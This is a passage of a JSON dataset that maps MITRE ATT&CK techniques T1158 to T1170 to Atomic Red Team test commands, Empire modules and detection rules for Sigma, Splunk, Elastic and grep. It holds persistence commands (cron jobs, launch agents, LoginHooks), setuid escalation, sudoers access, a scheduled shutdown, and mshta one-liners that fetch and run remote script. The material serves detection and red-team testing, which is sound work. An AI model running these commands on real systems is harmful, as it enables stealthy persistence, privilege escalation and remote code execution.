#{ads_filename} -value \"test2\"\nset-content -path . -stream #{ads_filename} -value \"test3\"\nls -Recurse | %{ gi $_.Fullname -stream *} | where stream -ne ':$Data' | Select-Object pschildname\n", "name": "powershell", "cleanup_command": "Remove-Item -Path #{file_name} -ErrorAction Ignore\n"}}], "attack_technique": "T1158"}}, {"Threat Hunting Tables": {"mitre_attack": "T1158", "file_value": "", "file_path": "", "parent_process": "attrib.exe", "itw_sample": "62b623a8dd6f7bfa7d1cff7b9db19f948840f36bee5c9063eaf5b898beb23c68", "chain_id": "100207", "registry_value": "", "mitre_caption": "hidden_files_dirs", "registry_path": "", "frequency": "low", "commandline_string": "+s +h * appdata", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}], "queries": [{"query": "Sysmon| where EventID == 1and process_path contains \"attrib.exe\"and (process_command_line contains \"+h\"or process_command_line contains \"+s\")", "product": "Azure Sentinel", "name": "Hidden Files And Directories"}, {"query": "Sysmon| where EventID == 1and (process_path contains \"*\\\\VolumeShadowCopy*\\\\*\"or process_command_line contains \"*\\\\VolumeShadowCopy*\\\\*\")", "product": "Azure Sentinel", "name": "Hidden Files And Directories VSS"}, {"query": "title: Hiding files with attrib.exe\nid: 4281cb20-2994-4580-aa63-c8b86d019934\nstatus: experimental\ndescription: Detects usage of attrib.exe to hide files from users.\nauthor: Sami Ruohonen\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image: '*\\attrib.exe'\n        CommandLine: '* +h *'\n    ini:\n        CommandLine: '*\\desktop.ini *'\n    intel:\n        ParentImage: '*\\cmd.exe'\n        CommandLine: +R +H +S +A \\\\*.cui\n        ParentCommandLine: C:\\WINDOWS\\system32\\\\*.bat\n    condition: selection and not (ini or intel)\nfields:\n    - CommandLine\n    - ParentCommandLine\n    - User\ntags:\n    - attack.defense_evasion\n    - attack.persistence\n    - attack.t1158\nfalsepositives:\n    - igfxCUIService.exe hiding *.cui files via .bat script (attrib.exe a child of cmd.exe and igfxCUIService.exe is the parent of the cmd.exe)\n    - msiexec.exe hiding desktop.ini\nlevel: low", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Hiding files with attrib.exe\nid: 4281cb20-2994-4580-aa63-c8b86d019934\nstatus: experimental\ndescription: Detects usage of attrib.exe to hide files from users.\nauthor: Sami Ruohonen\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image: '*\\attrib.exe'\n        CommandLine: '* +h *'\n    ini:\n        CommandLine: '*\\desktop.ini *'\n    intel:\n        ParentImage: '*\\cmd.exe'\n        CommandLine: +R +H +S +A \\\\*.cui\n        ParentCommandLine: C:\\WINDOWS\\system32\\\\*.bat\n    condition: selection and not (ini or intel)\nfields:\n    - CommandLine\n    - ParentCommandLine\n    - User\ntags:\n    - attack.defense_evasion\n    - attack.persistence\n    - attack.t1158\nfalsepositives:\n    - igfxCUIService.exe hiding *.cui files via .bat script (attrib.exe a child of cmd.exe and igfxCUIService.exe is the parent of the cmd.exe)\n    - msiexec.exe hiding desktop.ini\nlevel: low", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((Image.keyword:*\\\\\\\\attrib.exe AND CommandLine.keyword:*\\\\ \\\\+h\\\\ *) AND (NOT ((CommandLine.keyword:*\\\\\\\\desktop.ini\\\\ * OR (ParentImage.keyword:*\\\\\\\\cmd.exe AND CommandLine.keyword:\\\\+R\\\\ \\\\+H\\\\ \\\\+S\\\\ \\\\+A\\\\ \\\\\\\\*.cui AND ParentCommandLine.keyword:C\\\\:\\\\\\\\WINDOWS\\\\\\\\system32\\\\\\\\*.bat)))))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Hiding-files-with-attrib.exe <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Hiding files with attrib.exe\",\\n    \"description\": \"Detects usage of attrib.exe to hide files from users.\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.persistence\",\\n      \"attack.t1158\"\\n    ],\\n    \"query\": \"((Image.keyword:*\\\\\\\\\\\\\\\\attrib.exe AND CommandLine.keyword:*\\\\\\\\ \\\\\\\\+h\\\\\\\\ *) AND (NOT ((CommandLine.keyword:*\\\\\\\\\\\\\\\\desktop.ini\\\\\\\\ * OR (ParentImage.keyword:*\\\\\\\\\\\\\\\\cmd.exe AND CommandLine.keyword:\\\\\\\\+R\\\\\\\\ \\\\\\\\+H\\\\\\\\ \\\\\\\\+S\\\\\\\\ \\\\\\\\+A\\\\\\\\ \\\\\\\\\\\\\\\\*.cui AND ParentCommandLine.keyword:C\\\\\\\\:\\\\\\\\\\\\\\\\WINDOWS\\\\\\\\\\\\\\\\system32\\\\\\\\\\\\\\\\*.bat)))))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((Image.keyword:*\\\\\\\\\\\\\\\\attrib.exe AND CommandLine.keyword:*\\\\\\\\ \\\\\\\\+h\\\\\\\\ *) AND (NOT ((CommandLine.keyword:*\\\\\\\\\\\\\\\\desktop.ini\\\\\\\\ * OR (ParentImage.keyword:*\\\\\\\\\\\\\\\\cmd.exe AND CommandLine.keyword:\\\\\\\\+R\\\\\\\\ \\\\\\\\+H\\\\\\\\ \\\\\\\\+S\\\\\\\\ \\\\\\\\+A\\\\\\\\ \\\\\\\\\\\\\\\\*.cui AND ParentCommandLine.keyword:C\\\\\\\\:\\\\\\\\\\\\\\\\WINDOWS\\\\\\\\\\\\\\\\system32\\\\\\\\\\\\\\\\*.bat)))))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Hiding files with attrib.exe\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n      CommandLine = {{_source.CommandLine}}\\\\nParentCommandLine = {{_source.ParentCommandLine}}\\\\n             User = {{_source.User}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((Image.keyword:*\\\\\\\\attrib.exe AND CommandLine.keyword:* \\\\+h *) AND (NOT ((CommandLine.keyword:*\\\\\\\\desktop.ini * OR (ParentImage.keyword:*\\\\\\\\cmd.exe AND CommandLine.keyword:\\\\+R \\\\+H \\\\+S \\\\+A \\\\\\\\*.cui AND ParentCommandLine.keyword:C\\\\:\\\\\\\\WINDOWS\\\\\\\\system32\\\\\\\\*.bat)))))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((Image=\"*\\\\\\\\attrib.exe\" CommandLine=\"* +h *\") NOT ((CommandLine=\"*\\\\\\\\desktop.ini *\" OR (ParentImage=\"*\\\\\\\\cmd.exe\" CommandLine=\"+R +H +S +A \\\\\\\\*.cui\" ParentCommandLine=\"C:\\\\\\\\WINDOWS\\\\\\\\system32\\\\\\\\*.bat\")))) | table CommandLine,ParentCommandLine,User", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" (Image=\"*\\\\\\\\attrib.exe\" CommandLine=\"* +h *\")  -((event_id=\"1\" (CommandLine=\"*\\\\\\\\desktop.ini *\" OR (ParentImage=\"*\\\\\\\\cmd.exe\" CommandLine=\"+R +H +S +A \\\\\\\\*.cui\" ParentCommandLine=\"C:\\\\\\\\WINDOWS\\\\\\\\system32\\\\\\\\*.bat\")))))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*(?=.*.*\\\\attrib\\\\.exe)(?=.*.* \\\\+h .*)))(?=.*(?!.*(?:.*(?:.*(?:.*.*\\\\desktop\\\\.ini .*|.*(?:.*(?=.*.*\\\\cmd\\\\.exe)(?=.*\\\\+R \\\\+H \\\\+S \\\\+A \\\\\\\\.*\\\\.cui)(?=.*C:\\\\WINDOWS\\\\system32\\\\\\\\.*\\\\.bat))))))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "There are 2 ways by which we can capture this", "product": "Splunk", "name": null}, {"query": "```", "product": "Splunk", "name": null}, {"query": "index=linux sourcetype=bash_history bash_command=\"mkdir .*\" | table host,user_name,bash_command", "product": "Splunk", "name": null}, {"query": "```", "product": "Splunk", "name": null}, {"query": "```", "product": "Splunk", "name": null}, {"query": "index=linux sourcetype=bash_history bash_command=\"mv * .*\" | table host,user_name,bash_command", "product": "Splunk", "name": null}, {"query": "```", "product": "Splunk", "name": null}, {"query": "find_hidden_files.sh script can be run on a regular interval and check for any suspecious file creation. A whitelist can be craeted to filter out the standard hidden files/directories in a linux system.", "product": "Splunk", "name": null}, {"query": "```", "product": "Splunk", "name": null}, {"query": "find /home/ -name \".*\"", "product": "Splunk", "name": null}, {"query": "find /home/ -type d -name \".*\"", "product": "Splunk", "name": null}, {"query": "find /home/ -type f -name \".*\"", "product": "Splunk", "name": null}, {"query": "```", "product": "Splunk", "name": null}], "possible_detections": [{"data_source": "bash_history logs"}, {"data_source": "find the hidden files/dirs from certain directory paths like (/home/$user) and dump it to a location and ingest the file and look for any malicious hidden files (scripted input to the Splunk)"}], "attack_paths": []}, {"commands": [], "command_list": [], "technique_id": "T1159", "parsed_datasets": [{"Atomic Red Team Test - Launch Agent": {"display_name": "Launch Agent", "atomic_tests": [{"description": "Create a plist and execute it\n", "supported_platforms": ["macos"], "name": "Launch Agent", "executor": {"steps": "1. Create file - .client\n\n2. osascript -e 'tell app \"Finder\" to display dialog \"Hello World\"'\n\n3. Place the following in a new file under ~/Library/LaunchAgents as com.atomicredteam.plist\n\n4.\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n <key>KeepAlive</key>\n <true/>\n <key>Label</key>\n <string>com.client.client</string>\n <key>ProgramArguments</key>\n <array>\n <string>/Users/<update path to .clent file>/.client</string>\n </array>\n <key>RunAtLoad</key>\n <true/>\n <key>NSUIElement</key>\n <string>1</string>\n</dict>\n</plist>\n\n5. launchctl load -w ~/Library/LaunchAgents/com.atomicredteam.plist\n", "name": "manual"}}], "attack_technique": "T1159"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/persistence/osx/launchdaemonexecutable", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/persistence/osx/launchdaemonexecutable", "name": "Empire Module Command"}], "command_list": ["python/persistence/osx/launchdaemonexecutable", "python/persistence/osx/launchdaemonexecutable"], "technique_id": "T1160", "parsed_datasets": [{"Atomic Red Team Test - Launch Daemon": {"display_name": "Launch Daemon", "atomic_tests": [{"description": "Utilize LaunchDaemon to launch `Hello World`\n", "supported_platforms": ["macos"], "name": "Launch Daemon", "executor": {"steps": "1. Place the following file (com.example.hello) in /System/Library/LaunchDaemons or /Library/LaunchDaemons\n2.\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n    <key>Label</key>\n    <string>com.example.hello</string>\n    <key>ProgramArguments</key>\n    <array>\n        <string>hello</string>\n        <string>world</string>\n    </array>\n    <key>KeepAlive</key>\n    <true/>\n</dict>\n</plist>\n", "name": "manual"}}], "attack_technique": "T1160"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1160", "Empire Module": "python/persistence/osx/launchdaemonexecutable", "Technique": "Launch Daemon", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"python/persistence/osx/launchdaemonexecutable\":  [\"T1160\"],"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1163/T1163.yaml", "command": "echo osascript -e 'tell app \"Finder\" to display dialog \"Hello World\"' >> /etc/rc.common\n", "name": null}], "command_list": ["echo osascript -e 'tell app \"Finder\" to display dialog \"Hello World\"' >> /etc/rc.common\n"], "technique_id": "T1163", "parsed_datasets": [{"Atomic Red Team Test - rc.common": {"display_name": "rc.common", "atomic_tests": [{"description": "Modify rc.common\n\n[Reference](https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/StartupItems.html)\n", "supported_platforms": ["macos"], "name": "rc.common", "executor": {"command": "echo osascript -e 'tell app \"Finder\" to display dialog \"Hello World\"' >> /etc/rc.common\n", "name": "sh"}}], "attack_technique": "T1163"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1164/T1164.yaml", "command": "sudo defaults write com.apple.loginwindow LoginHook /path/to/script\nsudo defaults delete com.apple.loginwindow LoginHook\n", "name": null}], "command_list": ["sudo defaults write com.apple.loginwindow LoginHook /path/to/script\nsudo defaults delete com.apple.loginwindow LoginHook\n"], "technique_id": "T1164", "parsed_datasets": [{"Atomic Red Team Test - Re-Opened Applications": {"display_name": "Re-Opened Applications", "atomic_tests": [{"description": "Plist Method\n\n[Reference](https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CustomLogin.html)\n", "supported_platforms": ["macos"], "name": "Re-Opened Applications", "executor": {"steps": "1. create a custom plist:\n\n    ~/Library/Preferences/com.apple.loginwindow.plist\n\nor\n\n    ~/Library/Preferences/ByHost/com.apple.loginwindow.*.plist\n", "name": "manual"}}, {"description": "Mac Defaults\n\n[Reference](https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CustomLogin.html)\n", "supported_platforms": ["macos"], "name": "Re-Opened Applications", "input_arguments": {"script": {"default": "/path/to/script", "type": "path", "description": "path to script"}}, "executor": {"command": "sudo defaults write com.apple.loginwindow LoginHook #{script}\nsudo defaults delete com.apple.loginwindow LoginHook\n", "name": "sh"}}], "attack_technique": "T1164"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1165/T1165.yaml", "command": "sudo touch /Library/StartupItems/EvilStartup.plist\n", "name": null}], "command_list": ["sudo touch /Library/StartupItems/EvilStartup.plist\n"], "technique_id": "T1165", "parsed_datasets": [{"Atomic Red Team Test - Startup Items": {"display_name": "Startup Items", "atomic_tests": [{"description": "Modify or create an file in /Library/StartupItems\n\n[Reference](https://www.alienvault.com/blogs/labs-research/diversity-in-recent-mac-malware)\n", "supported_platforms": ["macos"], "name": "add file to Local Library StartupItems", "executor": {"elevation_required": true, "command": "sudo touch /Library/StartupItems/EvilStartup.plist\n", "name": "sh", "cleanup_command": "sudo rm /Library/StartupItems/EvilStartup.plist\n"}}], "attack_technique": "T1165"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1166/T1166.yaml", "command": "copy PathToAtomicsFolder/T1166/src/hello.c /tmp/hello.c\ncd /tmp\nsudo chown root hello.c\nsudo make hello\nsudo chown root hello\nsudo chmod u+s hello\n./hello\n", "name": null}, {"source": "atomics/T1166/T1166.yaml", "command": "sudo touch /tmp/evilBinary\nsudo chown root /tmp/evilBinary\nsudo chmod u+s /tmp/evilBinary\n", "name": null}, {"source": "atomics/T1166/T1166.yaml", "command": "sudo touch /tmp/evilBinary\nsudo chown root /tmp/evilBinary\nsudo chmod g+s /tmp/evilBinary\n", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "sudo chmod u+s hello", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "sudo chmod u+s #{file_to_setuid}", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "sudo chmod g+s #{file_to_setuid}", "name": null}], "command_list": ["copy PathToAtomicsFolder/T1166/src/hello.c /tmp/hello.c\ncd /tmp\nsudo chown root hello.c\nsudo make hello\nsudo chown root hello\nsudo chmod u+s hello\n./hello\n", "sudo touch /tmp/evilBinary\nsudo chown root /tmp/evilBinary\nsudo chmod u+s /tmp/evilBinary\n", "sudo touch /tmp/evilBinary\nsudo chown root /tmp/evilBinary\nsudo chmod g+s /tmp/evilBinary\n", "sudo chmod u+s hello", "sudo chmod u+s #{file_to_setuid}", "sudo chmod g+s #{file_to_setuid}"], "technique_id": "T1166", "parsed_datasets": [{"Atomic Red Team Test - Setuid and Setgid": {"display_name": "Setuid and Setgid", "atomic_tests": [{"description": "Make, change owner, and change file attributes on a C source code file\n", "supported_platforms": ["macos", "linux"], "name": "Make and modify binary from C source", "input_arguments": {"payload": {"default": "PathToAtomicsFolder/T1166/src/hello.c", "type": "path", "description": "hello.c payload"}}, "executor": {"elevation_required": true, "command": "copy #{payload} /tmp/hello.c\ncd /tmp\nsudo chown root hello.c\nsudo make hello\nsudo chown root hello\nsudo chmod u+s hello\n./hello\n", "name": "sh", "cleanup_command": "sudo rm ./hello\nsudo rm /tmp/hello.c\n"}}, {"description": "This test sets the SetUID flag on a file in Linux and macOS.\n", "supported_platforms": ["macos", "linux"], "name": "Set a SetUID flag on file", "input_arguments": {"file_to_setuid": {"default": "/tmp/evilBinary", "type": "path", "description": "Path of file to set SetUID flag"}}, "executor": {"elevation_required": true, "command": "sudo touch #{file_to_setuid}\nsudo chown root #{file_to_setuid}\nsudo chmod u+s #{file_to_setuid}\n", "name": "sh", "cleanup_command": "sudo rm #{file_to_setuid}\n"}}, {"description": "This test sets the SetGID flag on a file in Linux and macOS.\n", "supported_platforms": ["macos", "linux"], "name": "Set a SetGID flag on file", "input_arguments": {"file_to_setuid": {"default": "/tmp/evilBinary", "type": "path", "description": "Path of file to set SetGID flag"}}, "executor": {"elevation_required": true, "command": "sudo touch #{file_to_setuid}\nsudo chown root #{file_to_setuid}\nsudo chmod g+s #{file_to_setuid}\n", "name": "sh", "cleanup_command": "sudo rm #{file_to_setuid}\n"}}], "attack_technique": "T1166"}}], "queries": [{"query": "index=linux sourcetype=bash_history \"chmod 4***\" OR \"chmod 2***\" OR \"chmod u+s\" OR \"chmod g+s\" | table host,user_name,bash_command", "product": "Splunk", "name": null}, {"query": "find Setuid: find / -type f -perm /4000 OR find / -type f -perm /u+s", "product": "Splunk", "name": null}, {"query": "find Setgid: find / -type f -perm /2000 OR find / -type f -perm /g+s", "product": "Splunk", "name": null}, {"query": "Create a scripted input to ingest the files with Setuid and Setgid bits set and compare it with the expectde whitelist.", "product": "Splunk", "name": null}], "possible_detections": [{"data_source": "bash_history"}, {"data_source": "scripted_input"}], "attack_paths": []}, {"commands": [{"source": "atomics/T1168/T1168.yaml", "command": "echo \"* * * * * #{command}\" > /tmp/persistevil && crontab /tmp/persistevil\n", "name": null}, {"source": "atomics/T1168/T1168.yaml", "command": "echo \"* * * * * /tmp/evil.sh\" > /tmp/persistevil && crontab /tmp/persistevil\n", "name": null}, {"source": "atomics/T1168/T1168.yaml", "command": "echo \"#{command}\" > /etc/cron.daily/persistevil\n", "name": null}, {"source": "atomics/T1168/T1168.yaml", "command": "echo \"echo 'Hello from Atomic Red Team' > /tmp/atomic.log\" > /etc/cron.daily/persistevil\n", "name": null}, {"source": "Threat Hunting Tables", "command": "bash crontab", "name": null}, {"source": "Threat Hunting Tables", "command": "shell crontab", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/persistence/multi/crontab", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/persistence/multi/crontab", "name": "Empire Module Command"}, {"source": "Kirtar22/Litmus_Test", "command": "echo \"* * * * * #{command}\" > #{tmp_cron} && crontab #{tmp_cron}", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "echo \"#{command}\" > /etc/cron.daily/#{cron_script_name}", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "at now + 1 minute -f script.sh", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "echo \"shutdown -h now\" | at -m 23:5", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "at now + 1 minute | ping -c 4 google.com > /home/ec2-user/google6.txt", "name": null}], "command_list": ["echo \"* * * * * #{command}\" > /tmp/persistevil && crontab /tmp/persistevil\n", "echo \"* * * * * /tmp/evil.sh\" > /tmp/persistevil && crontab /tmp/persistevil\n", "echo \"#{command}\" > /etc/cron.daily/persistevil\n", "echo \"echo 'Hello from Atomic Red Team' > /tmp/atomic.log\" > /etc/cron.daily/persistevil\n", "bash crontab", "shell crontab", "python/persistence/multi/crontab", "python/persistence/multi/crontab", "echo \"* * * * * #{command}\" > #{tmp_cron} && crontab #{tmp_cron}", "echo \"#{command}\" > /etc/cron.daily/#{cron_script_name}", "at now + 1 minute -f script.sh", "echo \"shutdown -h now\" | at -m 23:5", "at now + 1 minute | ping -c 4 google.com > /home/ec2-user/google6.txt"], "technique_id": "T1168", "parsed_datasets": [{"Atomic Red Team Test - Local Job Scheduling": {"display_name": "Local Job Scheduling", "atomic_tests": [{"description": "This test replaces the current user's crontab file with the contents of the referenced file. This technique was used by numerous IoT automated exploitation attacks.\n", "supported_platforms": ["macos", "linux"], "name": "Cron - Replace crontab with referenced file", "input_arguments": {"tmp_cron": {"default": "/tmp/persistevil", "type": "path", "description": "Temporary reference file to hold evil cron schedule"}, "command": {"default": "/tmp/evil.sh", "type": "string", "description": "Command to execute"}}, "executor": {"command": "echo \"* * * * * #{command}\" > #{tmp_cron} && crontab #{tmp_cron}\n", "name": "bash"}}, {"description": "This test adds a script to a cron folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.\n", "supported_platforms": ["macos", "linux"], "name": "Cron - Add script to cron folder", "input_arguments": {"cron_script_name": {"default": "persistevil", "type": "string", "description": "Name of file to store in cron folder"}, "command": {"default": "echo 'Hello from Atomic Red Team' > /tmp/atomic.log", "type": "string", "description": "Command to execute"}}, "executor": {"command": "echo \"#{command}\" > /etc/cron.daily/#{cron_script_name}\n", "name": "bash"}}, {"description": "This test adds persistence via a plist to execute via the macOS Event Monitor Daemon. \n", "supported_platforms": ["macos", "linux"], "name": "Event Monitor Daemon Persistence", "executor": {"steps": "1. Place this file in /etc/emond.d/rules/atomicredteam.plist\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<array>\n    <dict>\n        <key>name</key>\n        <string>atomicredteam</string>\n        <key>enabled</key>\n        <true/>\n        <key>eventTypes</key>\n        <array>\n            <string>startup</string>\n        </array>\n        <key>actions</key>\n        <array>\n            <dict>\n                <key>command</key>\n                <string>/usr/bin/say</string>\n                <key>user</key>\n                <string>root</string>\n                <key>arguments</key>\n                    <array>\n                        <string>-v Tessa</string>\n                        <string>I am a persistent startup item.</string>\n                    </array>\n                <key>type</key>\n                <string>RunCommand</string>\n            </dict>\n        </array>\n    </dict>\n</array>\n</plist>\n\n2. Place an empty file in /private/var/db/emondClients/\n\n3. sudo touch /private/var/db/emondClients/randomflag\n", "name": "manual"}}], "attack_technique": "T1168"}}, {"Threat Hunting Tables": {"mitre_attack": "T1168", "file_value": "", "file_path": "", "parent_process": "bash", "itw_sample": "", "chain_id": "100200", "registry_value": "", "mitre_caption": "cron_job", "registry_path": "", "frequency": "high", "commandline_string": "crontab", "loaded_dll": "", "os": "mac", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1168", "file_value": "", "file_path": "", "parent_process": "shell", "itw_sample": "", "chain_id": "100202", "registry_value": "", "mitre_caption": "cron_job", "registry_path": "", "frequency": "high", "commandline_string": "crontab", "loaded_dll": "", "os": "linux", "sub_process_1": "", "sub_process_2": ""}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1168", "Empire Module": "python/persistence/multi/crontab", "Technique": "Local Job Scheduling", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"python/persistence/multi/crontab\":  [\"T1168\"],"}}], "queries": [{"query": "1. bash_history : track the command \"crontab\" - you may need to look for the commands crontab <file>", "product": "Splunk", "name": null}, {"query": "", "product": "Splunk", "name": null}, {"query": "index=linux sourcetype=bash_history bash_command=\"crontab *\" | table host, user_name, bash_command", "product": "Splunk", "name": null}, {"query": "2. /var/log/cron :  look for \"crontab\" & \"REPLACE\" in the cron logs", "product": "Splunk", "name": null}, {"query": "index=linux crontab replace", "product": "Splunk", "name": null}, {"query": "3. /var.log/cron - track CMD command", "product": "Splunk", "name": null}, {"query": "cat /var/log/cron | grep CMD | cut -d \" \" -f 9 |sort | uniq -c  | sort -rn will give you all the jobs which run in the environment with its number starting from high to low. You can look for a suspecious job/s which are not a part of a whitelisted jobs.", "product": "Splunk", "name": null}, {"query": "4. index=linux sourcetype=bash_history at", "product": "Splunk", "name": null}], "possible_detections": [{"data_source": "/var/log/cron"}, {"data_source": "bash_history"}], "attack_paths": []}, {"commands": [{"source": "atomics/T1169/T1169.yaml", "command": "sudo -l\nsudo su\ncat /etc/sudoers\nvim /etc/sudoers\n", "name": null}, {"source": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "command": "History\nOct 18 11:09:54 icbc sudo: test321: TTY = pts / 1; PWD = /; USER = # - 1; COMMAND = / usr / bin / id\nOct 18 11:11:59 icbc sudo: test321: TTY = pts / 1; PWD = /; USER = # 4294967295; COMMAND = / usr / bin / id", "name": "History"}, {"source": "Kirtar22/Litmus_Test", "command": "cat /etc/sudoers", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "vim /etc/sudoers", "name": null}], "command_list": ["sudo -l\nsudo su\ncat /etc/sudoers\nvim /etc/sudoers\n", "History\nOct 18 11:09:54 icbc sudo: test321: TTY = pts / 1; PWD = /; USER = # - 1; COMMAND = / usr / bin / id\nOct 18 11:11:59 icbc sudo: test321: TTY = pts / 1; PWD = /; USER = # 4294967295; COMMAND = / usr / bin / id", "cat /etc/sudoers", "vim /etc/sudoers"], "technique_id": "T1169", "parsed_datasets": [{"Atomic Red Team Test - SUDO": {"display_name": "SUDO", "atomic_tests": [{"description": "Common Sudo enumeration methods.\n", "supported_platforms": ["macos", "linux"], "name": "Sudo usage", "executor": {"command": "sudo -l\nsudo su\ncat /etc/sudoers\nvim /etc/sudoers\n", "name": "sh"}}], "attack_technique": "T1169"}}], "queries": [{"query": "Yml\ntitle: CVE-2019-14287 sudo misconfigured - Privilege Escalation\ndescription:. Ubuntu19.04 x64 test results (when sudo when configured to allow users to run any user command, the user can press to become root by specifying the user ID-1 or 4,294,967,295 has sufficient privileges sudo Runas specification keyword ALL users can use it to run commands as root, even if the specification is expressly prohibited Runas root access, as long as the specification Runas\n\u00a0Conditions listed first in the keyword ALL can)\nreferences: https://sysdig.com/blog/detecting-cve-2019-14287/\ntags: T1169\nstatus: experimental\nauthor: Blue team\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: linux\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0proc.name: 'sudo:'\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0proc.USER:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- '#-1'\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- '# 4294967295'\n\u00a0\u00a0\u00a0\u00a0condition: selection\nlevel: medium", "product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "name": "Yml"}, {"query": "index=linux sourcetype=\"linux_audit\" sudoers_change", "product": "Splunk", "name": null}, {"query": "Audit Rule : -w /etc/sudoers -p wa -k sudoers_change", "product": "Splunk", "name": null}], "possible_detections": [{"data_source": "auditlogs (audit.rules)"}, {"data_source": "bash_history logs"}], "attack_paths": []}, {"commands": [{"source": "atomics/T1170/T1170.yaml", "command": "mshta.exe javascript:a=(GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/src/mshta.sct')).Exec();close();      \n", "name": null}, {"source": "atomics/T1170/T1170.yaml", "command": "mshta.exe vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run(\"\"{local_file_path}\"\")(window.close)\")\n", "name": null}, {"source": "atomics/T1170/T1170.yaml", "command": "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -noexit -file $PathToAtomicsFolder\\T1170\\src\\powershell.ps1\"\":close\")\n", "name": null}, {"source": "atomics/T1170/T1170.yaml", "command": "$var =Invoke-WebRequest 